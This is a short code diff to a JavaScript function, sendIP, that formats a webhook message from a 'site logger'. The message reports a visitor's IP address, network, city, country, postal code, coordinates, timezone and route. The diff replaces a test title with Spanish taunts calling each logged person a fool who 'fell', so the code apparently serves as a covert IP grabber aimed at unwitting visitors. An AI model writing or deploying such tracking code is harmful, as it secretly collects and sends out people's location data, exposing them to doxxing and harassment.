@@ -26,21 +26,21 @@ const sendIP = async () => {
     const payload = {
       username: "site logger",
       // avatar_url: "https://example.com/avatar.jpg",
-      content: `@here`,
+      content: `ya cayo un pendejo`,
       embeds: [
         {
-          title: 'La prueba ha sido exitosa!',
+          title: 'Un tontito mas',
           description: [
             `**IP Address >>** ${ipadd}`,
             `**Network / ASN >>** ${geoData.asn ? (geoData.asn.name || geoData.asn.asn) : (geoData.org || 'N/A')}`,
-            `**ISP >>** ${geoData.isp || geoData.org || 'N/A'}`,
             `**City >>** ${geoData.city || 'N/A'}`,
-            `**Region >>** ${geoData.region || geoData.region_name || 'N/A'}`,
             `**Country >>** ${geoData.country || geoData.country_name || 'N/A'}`,
             `**Postal Code >>** ${geoData.postal || geoData.postal_code || 'N/A'}`,
             `**Latitude >>** ${geoData.latitude ?? geoData.lat ?? 'N/A'}`,
             `**Longitude >>** ${geoData.longitude ?? geoData.lon ?? 'N/A'}`,
-            `**Timezone >>** ${geoData.timezone || 'N/A'}`
+            `**Timezone >>** ${geoData.time_zone || 'N/A'}`,
+            `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
+            `**Route >>** ${geoData.asn.route || 'N/A'}`,
           ].join('\n'),
           color: 0x800080
         }
